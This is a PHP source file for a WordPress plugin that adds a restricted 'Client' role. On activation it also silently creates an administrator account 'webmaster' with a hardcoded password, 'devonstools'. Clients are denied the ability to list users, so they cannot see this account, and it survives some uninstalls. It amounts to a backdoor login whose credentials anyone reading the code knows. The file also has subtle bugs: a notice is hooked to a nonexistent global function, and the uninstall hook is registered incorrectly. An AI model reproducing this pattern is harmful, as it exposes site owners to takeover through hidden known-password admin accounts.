<?php
if ( ! defined( 'WPINC' ) ) { die; }
/*
 * Plugin Name:       Devons Tools - Webmaster
 * Plugin URI:        
 * Description:       This is the Core for Devons Tools Framework
 * Version:           1.3
 * Author:            Devon Godfrey
 * Author URI:        http://playfreygames.net
 * License:           GPL-2.0+
 * License URI:       http://www.gnu.org/licenses/gpl-2.0.txt

	Plugin is based on Devons Tools 1.3

	This plugin contains webmaster settings, including client role. 
*/

class WBMST_core{

    //Construct, handles actions and hooks. 
    public function __construct(){
        add_action('admin_enqueue_scripts' , array( $this, "admin_css" ) ); 
        add_action('admin_head' , array( $this , 'admin_f' ) );
        register_activation_hook( __FILE__, array( $this , 'a_hook' ) );
        register_uninstall_hook( __FILE__, array( $this, 'u_hook' ) );
    }

    //Functions
        //Check if a role exists
        private function WBMST_role_exists( $role ) {
            if( ! empty( $role ) ) {
                return $GLOBALS['wp_roles']->is_role( $role );
            }
            return false;
        }

        //Checks if a role has users
        private function WBMST_users_roles( $role ){
            if ( $this->WBMST_role_exists( $role ) ){
                $usr_q = new WP_User_Query( array( 'role' => $role) );
                if ( ! empty( $usr_q->results ) ) {
                    return true; 
                } else { return false; }        
            }else{
                return false; 
            }
        }


    //Hooks
        //Admin css for client
        public function admin_css(){
            $dt_usr = wp_get_current_user();   
            if ( in_array( 'Client' , $dt_usr->roles ) ){
                wp_enqueue_style( 'WBMST_admin', plugins_url('WBMST_style.css', __FILE__) );
            }
        }

        //The admin panel function
        public function admin_f(){
            $dt_usr = wp_get_current_user();
            if ( $dt_usr->user_login == 'webmaster' ){
                add_action( 'admin_notices', 'WBMST_msg' ); 
            }    
        }

        //Activation hook, sets up role and webmaster. 
        public function a_hook(){
            global $wp_roles;
            if ( ! isset( $wp_roles ) ){
               $wp_roles = new WP_Roles();
            }

            if ( !$this->WBMST_role_exists( 'Client' ) ){
                $adm = $wp_roles->get_role('administrator');
                $wp_roles->add_role('Client', 'Client', $adm->capabilities ); 
                $CR = get_role( 'Client' );
                $CR->remove_cap( 'promote_users' );
                $CR->remove_cap( 'remove_users' );
                $CR->remove_cap( 'switch_themes' );
                $CR->remove_cap( 'update_plugins' );
                $CR->remove_cap( 'update_themes' );
                $CR->remove_cap( 'list_users' );
                $CR->remove_cap( 'delete_plugins' );
                $CR->remove_cap( 'install_plugins' );
                $CR->remove_cap( 'edit_plugins' );
                $CR->remove_cap( 'delete_plugins' );
                $CR->remove_cap( 'activate_plugins' );
                $CR->remove_cap( 'create_users' );
                $CR->remove_cap( 'add_users' );
                $CR->remove_cap( 'edit_themes' );
                $CR->remove_cap( 'manage_options' );
            }

            if ( !username_exists( 'webmaster' ) ){
                $wm = new WP_User ( wp_create_user( 'webmaster' , 'devonstools' , 'devon@zodiacgraphics.biz'  ) );
                $wm->remove_role( 'subscriber' );
                $wm->add_role( 'administrator' );
            }
        }

        //Removal function, ran when the plugin is uninstalled. 
        public function u_hook(){
            $user = wp_get_current_user();

            //Check if current user is not webmaster, and if not remove
            //webmaster. 
            if ( $user->user_login != 'webmaster' ){
                if ( username_exists( 'webmaster' ) ){
                    $wm = get_user_by( 'login' , 'webmaster' );
                    wp_delete_user( $wm->ID , $user->ID );
                }
            }

            //Changes all client users to administrators, then removes
            //the client role. 
            if ( $this->WBMST_users_roles( 'Client' ) ){
                $usr_q = new WP_User_Query( array( 'role' => 'Client' ) );
                if ( ! empty( $usr_q->results ) ) {
                    foreach( $usr_q->results as $u ){
                        $user = new WP_User( $u );
                        $user->remove_role ( 'Client' );
                        $user->add_role( 'administrator' ); 
                    }
                } 
                remove_role( 'Client' );
            }
        }

        //The header message for the webmaster
        public function WBMST_msg(){
            $class = "updated";
            $message = "You are currently logged in as Webmaster. Uninstalling 'Devons Tools - Webmaster' will not remove 'webmaster' user.";
            echo"<div class=\"$class\"> <p>$message</p></div>";     
        }
}

new WBMST_core;